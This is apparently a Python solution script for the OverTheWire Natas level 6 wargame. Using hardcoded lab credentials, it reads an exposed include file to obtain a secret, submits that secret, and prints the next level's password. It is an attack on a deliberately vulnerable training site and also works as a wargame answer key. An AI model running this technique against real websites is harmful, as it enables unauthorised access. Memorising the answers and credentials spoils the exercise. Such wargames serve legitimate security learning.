#!/usr/bin/python3

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url+'/includes/secret.inc', auth = (username, password))
content = response.text
secret = re.findall('secret = "(.*)"',content)[0]
data = { 'secret':secret , 'submit':'submit' }
response = requests.post(url, auth = (username, password), data=data)
content = response.text

pwd = re.findall('natas7 is (.*)', content)[0]
print(pwd)

